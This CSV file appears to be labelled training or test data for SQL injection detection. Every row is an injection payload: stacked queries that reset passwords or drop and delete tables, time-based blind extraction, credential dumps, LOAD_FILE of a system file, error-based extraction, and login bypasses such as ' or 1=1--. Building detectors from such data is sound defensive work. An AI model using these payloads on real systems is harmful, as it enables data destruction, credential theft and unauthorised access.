column,num,,
123; update account_table set pw='pero' where uid='hoge' --,1,564.5,564
123; update account_table set pw='tehepero' where uid='hogehoge' --,1,102,102
123; update account_table set pw='aaaaa' where uid='111' --,1,,
123; update account_table set pw='pass' where uid='namae' --,1,,
123; update account_table set pw='password' where uid='admin' --,1,,
123; update account_table set pw='bbbbb' where uid='aaaaa' --,1,,
123; update account_table set pw='12345' where uid='12345' --,1,,
5; DROP TABLE members /* ,1,,
1; DROP TABLE users /* ,1,,
2; DROP TABLE tags /* ,1,,
14; DROP TABLE topics /* ,1,,
10; DROP TABLE comments /* ,1,,
10; DROP TABLE members /* ,1,,
10; DROP TABLE shops /* ,1,,
10; DROP TABLE users /* ,1,,
10; DROP TABLE texts /* ,1,,
; UPDATE addressbook SET address = '___',1,,
; UPDATE addressbook SET address = '',1,,
; UPDATE addressbook SET address = 'aaa',1,,
; UPDATE addressbook SET address = 'hogehoge',1,,
 exec id 1;delete from hoge;,1,,
 exec name 1;delete from users;,1,,
 exec title 1;delete from purcahse;,1,,
 exec name 1;delete from sample;,1,,
 exec name 1;delete from hoge;,1,,
 exec hoge 1;delete from pero;,1,,
 exec aaa 1;delete from bbb;,1,,
"SELECT if(substr((SELECT name FROM users LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1,,
"SELECT if(substr((SELECT description FROM gigs LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1,,
"SELECT if(substr((SELECT title FROM topics LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1,,
"SELECT if(substr((SELECT name FROM comments LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1,,
"SELECT if(substr((SELECT name FROM shops LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1,,
"SELECT if(substr((SELECT name FROM sample_table LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1,,
"SELECT if(substr((SELECT count FROM likes LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1,,
"SELECT if(substr((SELECT name FROM hogehoge LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1,,
"SELECT if(substr((SELECT name FROM  LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1,,
"SELECT if(substr((SELECT name FROM users LIMIT 1 OFFSET 0),1,1) = 'a',sleep(100),null);",1,,
"SELECT if(substr((SELECT email FROM members LIMIT 1 OFFSET 0),1,1) = 't',sleep(3),null);",1,,
SELECT 0x50 + 0x45,1,,
SELECT CHAR(0x95),1,,
SELECT CHAR(0x45),1,,
SELECT 0x66 + 0x66,1,,
SELECT 0x66 + 0x67,1,,
SELECT 0x66 + 0x68,1,,
SELECT login + '-' + password FROM users,1,,
SELECT login + '-' + password FROM admin_users,1,,
SELECT login + '-' + password FROM members ,1,,
"SELECT CONCAT(login, password) FROM members",1,,
"SELECT CONCAT(login, password) FROM users",1,,
"SELECT CONCAT(login, password) FROM admin_users",1,,
SELECT 0x457578 ,1,,
"SELECT CONCAT('0x',HEX('c:\\boot.ini'))
SELECT CONCAT('0x',HEX('c:\\boot.ini')) ",1,,
"SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))",1,,
SELECT LOAD_FILE(0x633A5C626F6F742E696E69) ,1,,
"select char(65, 66, 67)",1,,
"select extractvalue(char(30),concat(char(11,22),(select email from members limit 1 offset 0)));",1,,
"select extractvalue(char(60),concat(char(47,36),(select email from members limit 1 offset 0)));",1,,
"select extractvalue(char(6),concat(char(11,22),(select email from members limit 1 offset 0)));",1,,
"select extractvalue(char(60),concat(char(47,36),(select email from users limit 1 offset 0)));",1,,
"select extractvalue(char(60),concat(char(47,36),(select email from admin_users limit 1 offset 0)));",1,,
admin' --,1,,
admin' #,1,,
admin'/*,1,,
' or 1=1--,1,,
' or 1=1#,1,,
' or 1=1/*,1,,
') or '1'='1--,1,,
') or ('1'='1--,1,,
 UNION SELECT 1,1,,
1' or '1' = '1';--,1,,
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,IFNULL(CAST(column_name AS CHAR),0x20),0x626866616169,IFNULL(CAST(column_type AS CHAR),0x20),0x716a717a71),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6576656e74735f77616974735f73756d6d6172795f62795f696e7374616e6365 AND table_schema=0x706572666f726d616e63655f736368656d61-- Fuom",1,,
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,IFNULL(CAST(COUNT(*) AS CHAR),0x20),0x716a717a71),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6576656e74735f77616974735f73756d6d6172795f62795f696e7374616e6365 AND table_schema=0x706572666f726d616e63655f736368656d61-- qqHJ",1,,
"1' AND (SELECT 7063 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT REPEAT(0x34,1024)),0x716a717a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'nRny'='nRny",1,,
